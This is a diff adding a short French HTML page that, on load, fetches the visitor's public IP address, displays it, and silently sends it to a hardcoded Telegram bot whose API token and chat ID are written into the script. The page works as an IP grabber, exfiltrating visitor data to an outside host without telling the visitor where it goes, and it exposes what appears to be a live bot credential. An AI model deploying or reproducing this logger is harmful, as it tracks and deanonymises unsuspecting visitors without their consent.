@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Obtenir et envoyer l'adresse IP</title>
+</head>
+<body>
+    <h1>Information recupéré:</h1>
+    <p id="ip">Chargement...</p>
+
+    <script>
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                document.getElementById('ip').textContent = data.ip;
+
+                // Envoyer l'IP au bot Telegram
+                const telegramToken = '7425896855:AAFw5uVY6ml3XOLviqqVq-2gBvdPZPUMx7A';
+                const chatId = '6143012351';
+                const message = `Adresse IP: ${data.ip}`;
+                const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                await fetch(telegramApiUrl);
+            } catch (error) {
+                document.getElementById('ip').textContent = 'Impossible de récupérer l\'adresse IP';
+                console.error('Erreur:', error);
+            }
+        }
+
+        getIP();
+    </script>
+</body>
+</html>
